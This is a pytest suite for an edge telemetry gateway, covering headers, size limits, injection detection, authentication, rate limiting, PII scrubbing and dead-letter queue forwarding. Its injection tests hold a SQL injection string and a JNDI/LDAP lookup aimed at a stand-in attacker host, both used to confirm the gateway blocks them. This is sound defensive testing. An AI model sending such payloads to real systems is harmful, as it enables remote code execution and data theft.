"""Comprehensive automated test suite for Server A Standalone Edge Gateway (ZONE 2).

Validates all 8 perimeter guardrails:
1. Origin whitelisting & secure response headers
2. Slowloris & read timeouts
3. Hard body ceiling (50KB limit) -> HTTP 413
4. Anti-Attack: SQLi, RCE, script injection, JSON nesting depth
5. Project Key / DSN Authenticator -> HTTP 401
6. Leaky-Bucket Rate Limiter -> HTTP 429
7. Edge DLP & PII Scrubbing -> Secrets redacted
8. Fast ACK Dispatcher -> HTTP 202 Accepted
"""

import json
from fastapi.testclient import TestClient
from pathlib import Path
import sys

_CURRENT_DIR = str(Path(__file__).resolve().parent)
if _CURRENT_DIR not in sys.path:
    sys.path.insert(0, _CURRENT_DIR)

try:
    from v2.edge_gateway.app import app, config as gateway_cfg, edge_ip_limiter
    from v2.edge_gateway.config import get_gateway_config
except ImportError:
    from app import app, config as gateway_cfg, edge_ip_limiter
    from config import get_gateway_config

client = TestClient(app)
config = get_gateway_config()


def test_healthz_and_metrics():
    """Verify edge gateway liveness and operational metrics."""
    res = client.get("/healthz")
    assert res.status_code == 200
    assert res.json()["status"] == "healthy"

    res_metrics = client.get("/metrics")
    assert res_metrics.status_code == 200
    assert "guards" in res_metrics.json()


def test_status_dashboard_html():
    """Verify testing cockpit HTML status page renders with 200 OK."""
    res = client.get("/")
    assert res.status_code == 200
    assert "text/html" in res.headers["content-type"]
    assert "Ichnoscope Edge Telemetry Gateway" in res.text
    assert "Keep-Alive Heartbeat" in res.text

    res_live = client.get("/live")
    assert res_live.status_code == 200
    assert "text/html" in res_live.headers["content-type"]


def test_ping_core_endpoint():
    """Verify /api/ping-core returns json connectivity report."""
    res = client.get("/api/ping-core")
    assert res.status_code == 200
    data = res.json()
    assert "reachable" in data
    assert "latency_ms" in data


def test_layer1_secure_headers():
    """Verify Layer 1: Secure response headers are enforced."""
    res = client.get("/healthz")
    assert res.headers["x-content-type-options"] == "nosniff"
    assert res.headers["x-frame-options"] == "DENY"
    assert "strict-transport-security" in res.headers


def test_layer3_hard_body_ceiling_exceeded():
    """Verify Layer 3: Payloads exceeding 50KB are rejected with HTTP 413."""
    oversized_data = {"data": "A" * 55000}  # ~55KB
    headers = {"X-Ignoscope-Token": "demo_key"}
    res = client.post("/api/v1/telemetry/ingest", json=oversized_data, headers=headers)
    assert res.status_code == 413
    assert "50KB limit" in res.json()["detail"]


def test_layer4_anti_attack_sqli_detected():
    """Verify Layer 4: SQL Injection attack vector is intercepted and rejected with HTTP 400."""
    sqli_payload = {
        "event_id": "test_sqli",
        "error": "User input: ' UNION SELECT username, password FROM users --",
    }
    headers = {"X-Ignoscope-Token": "demo_key"}
    res = client.post("/api/v1/telemetry/ingest", json=sqli_payload, headers=headers)
    assert res.status_code == 400
    assert "SQL injection pattern detected" in res.json()["detail"]


def test_layer4_anti_attack_rce_detected():
    """Verify Layer 4: RCE / JNDI injection attack vector is intercepted and rejected."""
    rce_payload = {
        "event_id": "test_rce",
        "log_msg": "${jndi:ldap://evil-attacker.com/exploit}",
    }
    headers = {"X-Ignoscope-Token": "demo_key"}
    res = client.post("/api/v1/telemetry/ingest", json=rce_payload, headers=headers)
    assert res.status_code == 400
    assert "RCE or script injection pattern detected" in res.json()["detail"]


def test_layer4_json_nesting_depth_exceeded():
    """Verify Layer 4: Recursive JSON nesting depth exceeding 10 levels is rejected."""
    nested = {"level": 1}
    cur = nested
    for i in range(2, 13):
        cur["sub"] = {"level": i}
        cur = cur["sub"]

    headers = {"X-Ignoscope-Token": "demo_key"}
    res = client.post("/api/v1/telemetry/ingest", json=nested, headers=headers)
    assert res.status_code == 400
    assert "nesting depth limit (10 levels) exceeded" in res.json()["detail"]


def test_layer5_missing_project_auth_rejected():
    """Verify Layer 5: Requests without project key or DSN are rejected with HTTP 401."""
    res = client.post("/api/v1/telemetry/ingest", json={"error": "sample"})
    assert res.status_code == 401
    assert "Missing telemetry authentication key" in res.json()["detail"]


def test_layer7_and_layer8_valid_ingest_with_pii_scrubbing():
    """Verify Layers 7 & 8: Valid telemetry is scrubbed of PII and acknowledged with HTTP 202."""
    valid_payload = {
        "event_id": "event_valid_101",
        "environment": "production",
        "exception": {
            "values": [
                {
                    "type": "KeyError",
                    "value": "Missing key in user alice@example.com with token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDcBQACt7DanfFIOvfGQ",
                }
            ]
        },
        "request": {
            "headers": {
                "Authorization": "Bearer sensitive_secret_token_abc",
                "Cookie": "session_id=12345",
            }
        },
    }

    # Transmit via standard Sentry header
    headers = {
        "X-Sentry-Auth": "Sentry sentry_version=7, sentry_key=sentry_public_key, sentry_client=sentry.python/1.0",
        "Content-Type": "application/json",
    }

    res = client.post("/api/1/store/", json=valid_payload, headers=headers)
    assert res.status_code == 202
    data = res.json()
    assert data["status"] == "accepted"
    assert data["id"] == "event_valid_101"


def test_layer6_rate_limiter_throttle():
    """Verify Layer 6: Excessive burst requests trigger HTTP 429 and Retry-After header."""
    # Exhaust the test client IP's bucket
    client_ip = "testclient"
    for _ in range(70):
        edge_ip_limiter.check(client_ip)

    headers = {"X-Ignoscope-Token": "demo_key"}
    res = client.post("/api/v1/telemetry/ingest", json={"error": "burst"}, headers=headers)
    assert res.status_code == 429
    assert "Retry-After" in res.headers
    assert "Too Many Requests" in res.json()["error"]


def test_edge_forwarder_dlq(tmp_path):
    """Verify that when Server B is unavailable, events are spooled to local SQLite DLQ and can be drained."""
    from unittest.mock import patch
    from v2.edge_gateway.forwarder import drain_dlq, forward_to_server_b, init_dlq_db
    import sqlite3

    dlq_db = str(tmp_path / "test_dlq.db")
    init_dlq_db(dlq_db)

    # 1. Forwarder attempts delivery to unreachable Server B -> spooled to DLQ
    with patch("httpx.Client.post", side_effect=Exception("Connection refused (Server B offline)")):
        success = forward_to_server_b(
            project_id="test-proj",
            environment="production",
            client_ip="192.168.1.100",
            sanitized_payload={"event_id": "dlq-123", "error": "test"},
            db_path=dlq_db,
        )
        assert success is False

    # Verify DLQ contains 1 record
    with sqlite3.connect(dlq_db) as conn:
        cursor = conn.execute("SELECT count(*) FROM edge_dlq;")
        assert cursor.fetchone()[0] == 1

    # 2. Server B comes back online -> drain_dlq succeeds
    from unittest.mock import MagicMock
    mock_resp = MagicMock()
    mock_resp.status_code = 200

    with patch("httpx.Client.post", return_value=mock_resp):
        drained = drain_dlq(max_batch=10, db_path=dlq_db)
        assert drained == 1

    # Verify DLQ is now empty
    with sqlite3.connect(dlq_db) as conn:
        cursor = conn.execute("SELECT count(*) FROM edge_dlq;")
        assert cursor.fetchone()[0] == 0


def test_limiter_lru_eviction():
    """Verify LeakyBucketLimiter evicts stale/oldest buckets without resetting active limits."""
    from v2.edge_gateway.limiter import LeakyBucketLimiter

    limiter = LeakyBucketLimiter(capacity=10, fill_rate_per_min=60.0, max_entries=5)

    # Add 5 keys
    for i in range(5):
        res = limiter.check(f"key-{i}")
        assert res.allowed is True

    assert len(limiter._buckets) == 5

    # Exhaust key-0
    for _ in range(12):
        limiter.check("key-0")
    assert limiter.check("key-0").allowed is False

    # Adding a new key should evict an old key, but keep key-0 throttled
    limiter.check("key-new")
    assert len(limiter._buckets) <= 5
    assert limiter.check("key-0").allowed is False


